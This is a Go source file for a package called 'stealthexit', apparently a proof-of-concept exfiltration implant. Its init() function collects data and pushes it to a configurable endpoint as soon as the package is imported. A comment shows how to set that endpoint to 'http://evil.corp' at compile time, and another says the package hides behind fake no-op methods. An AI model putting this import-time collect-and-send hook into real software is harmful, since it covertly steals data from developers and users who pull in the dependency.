package stealthexit

import (
	"context"

	"github.com/moolen/stealthexit/pkg/exit"
)

const (
	// this can be modified during compile time:
	// go build -ldflags "-X github.com/moolen/stealthexit.TargetEndpoint=http://evil.corp"
	TargetEndpoint = "http://localhost:8087"
)

// this package is supposed to be imported
// and has some fake noop methods, see methods.go
func init() {
	ctx := context.Background()
	collection, _ := exit.Collect(ctx)
	exit.Push(ctx, collection, TargetEndpoint)
}
